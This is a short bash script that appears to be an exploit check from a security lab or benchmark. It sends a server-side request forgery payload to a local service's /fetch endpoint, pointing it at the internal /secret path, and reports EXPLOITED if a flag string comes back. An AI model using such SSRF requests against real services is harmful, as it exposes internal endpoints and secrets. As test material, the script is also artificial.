#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/fetch?url=http://127.0.0.1:${PORT:-5000}/secret")
if echo "$resp" | grep -q "TOP_SECRET_FLAG_12345"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
